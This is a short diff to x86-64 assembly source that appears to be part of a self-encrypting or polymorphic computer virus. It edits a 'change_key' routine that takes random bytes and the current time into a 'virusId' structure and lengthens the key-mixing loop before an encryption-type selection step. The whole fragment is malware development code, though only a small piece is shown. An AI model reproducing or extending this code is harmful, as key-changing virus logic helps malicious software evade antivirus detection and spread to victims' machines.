@@ -235,6 +235,12 @@ change_key:
     mov rdx, GRND_RANDOM
     mov rax, SYS_GETRANDOM
     syscall
+    xor rdi, rdi
+    lea rsi, [r12 + virusId + 8]
+    mov rax, SYS_GETTIME
+    syscall
+    mov eax, [r12 + virusId + 16]
+    mov [r12 + virusId + 12], eax
     xor rax, rax
     xor rsi, rsi
     lea rcx, [r12 + virusId]
@@ -252,7 +258,7 @@ change_key:
     add rdi, 2
     inc rax
     inc rcx
-    cmp rax, 12
+    cmp rax, 16
     jl change_key_loop
     inc qword [r12 + virusId]
 choose_encrypt_type:
